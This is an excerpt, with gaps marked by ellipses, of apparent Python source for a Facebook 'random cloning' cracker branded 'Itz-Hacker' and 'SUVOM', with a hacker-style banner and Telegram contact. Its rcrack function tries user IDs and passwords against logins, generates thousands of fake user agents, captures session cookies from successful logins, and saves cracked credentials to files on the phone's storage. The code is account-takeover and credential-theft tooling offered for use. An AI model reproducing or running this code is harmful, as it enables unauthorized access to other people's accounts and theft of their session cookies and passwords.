...
for ua in range(5000):
    ...
    ugen.append(uaku2)
os.system("espeak \"Wall come To Itz-Hacker World , Bangladesh Random Cloning Start Please Wait\"")
logo=("""
\t\033[38;5;46m███████╗██╗   ██╗██╗   ██╗ ██████╗ ███╗   ███╗
\t\033[38;5;46m██╔════╝██║   ██║██║   ██║██╔═══██╗████╗ ████║
\t\033[38;5;46m███████╗██║   ██║██║   ██║██║   ██║██╔████╔██║
...
\033[38;5;46m=======================\33[38;5;196m 𝙎𝙐𝙑𝙊𝙈 \033[38;5;46m========================
\033[38;5;46m︎[😈]\x1b[1;96m𝙉𝘼𝙈𝙀\33[38;5;196m        : ︎[😈]𝙎𝙐𝙑𝙊𝙈\33[38;5;196m         
\033[38;5;46m︎[😈]\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\33[38;5;196m    : ︎[😈]𝙎𝙐𝙑𝙊𝙈 𝙆𝙐𝙉𝘿𝙐\33[38;5;196m         
\033[38;5;46m︎[😈]\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\33[38;5;196m      : ︎[😈]𝙄𝙩𝙯 𝙃𝙖𝙘𝙠𝙚𝙧\33[38;5;196m       
\033[38;5;46m︎[😈]\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\33[38;5;196m  : ︎[😈]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\33[38;5;196m        
\033[38;5;46m︎[😈]\x1b[1;96m𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈\33[38;5;196m    : ︎[😈]𝙝𝙩𝙩𝙥𝙨://𝙩.𝙢𝙚/𝙨𝙪𝙫𝙤𝙢420\33[38;5;196m     
\033[38;5;46m︎[😈]\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\33[38;5;196m  : ︎[😈]𝗥𝟰𝗡𝗗𝗢𝗠-𝗖𝗟𝗢𝗡𝗜𝗡𝗚\33[38;5;196m     
\033[38;5;46m︎[😈]\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\33[38;5;196m: ︎[😈]𝗣𝗥𝗘𝗠𝗜𝗨𝗠-𝗩𝟎𝟏\33[38;5;196m        
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[Itz-Hacker-OK🔥] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/Itz-Hacker-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Itz-Hacker-CP🛡️] {uid} • {ps}")
                open('/sdcard/Itz-Hacker-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
